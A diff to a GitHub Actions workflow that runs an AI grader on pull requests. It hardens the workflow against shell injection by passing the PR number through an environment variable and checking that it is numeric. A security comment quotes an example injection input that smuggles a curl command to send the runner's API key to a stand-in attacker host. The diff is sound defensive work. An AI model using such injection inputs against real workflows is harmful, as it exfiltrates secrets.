@@ -24,6 +24,7 @@ on:
       pr:
         description: PR number to grade
         required: true
+        type: number   # GitHub rejects non-numeric dispatch input at source
 
 permissions:
   contents: read
@@ -49,13 +50,24 @@ jobs:
           python-version: '3.11'
 
       - name: Run grader
+        # SECURITY: `PR_NUMBER` is passed through `env:`, not interpolated as
+        # `${{ }}` into the shell body. GitHub expands `${{ }}` into `run:`
+        # *before* the shell parses it, so a `workflow_dispatch` input like
+        # `1"; curl evil?$ANTHROPIC_API_KEY; #` would execute as script and
+        # exfiltrate the runner's secrets. An env value is data, not script.
+        # The `[[ =~ ^[0-9]+$ ]]` check is defence-in-depth on top of the
+        # `type: number` declaration on the dispatch input.
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
           OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
           GH_TOKEN: ${{ github.token }}
+          PR_NUMBER: ${{ github.event.pull_request.number || github.event.inputs.pr }}
         run: |
-          pr_num="${{ github.event.pull_request.number || github.event.inputs.pr }}"
-          ./scripts/ai/grade_pr.py --pr "$pr_num" --out-json /tmp/grade.json
+          if [[ ! "$PR_NUMBER" =~ ^[0-9]+$ ]]; then
+            echo "Refusing: PR number '$PR_NUMBER' is not numeric." >&2
+            exit 1
+          fi
+          ./scripts/ai/grade_pr.py --pr "$PR_NUMBER" --out-json /tmp/grade.json
           # Extract the markdown summary for the PR comment.
           python3 -c "import json; d=json.load(open('/tmp/grade.json')); print(d['summary_md'])" > /tmp/grade.md
 
@@ -63,10 +75,14 @@ jobs:
         if: always()
         env:
           GH_TOKEN: ${{ github.token }}
+          PR_NUMBER: ${{ github.event.pull_request.number || github.event.inputs.pr }}
         run: |
+          if [[ ! "$PR_NUMBER" =~ ^[0-9]+$ ]]; then
+            echo "Refusing: PR number '$PR_NUMBER' is not numeric." >&2
+            exit 1
+          fi
           if [[ -s /tmp/grade.md ]]; then
-            gh pr comment "${{ github.event.pull_request.number || github.event.inputs.pr }}" \
-              --body-file /tmp/grade.md
+            gh pr comment "$PR_NUMBER" --body-file /tmp/grade.md
           else
             echo "No grade summary produced; skipping comment."
           fi
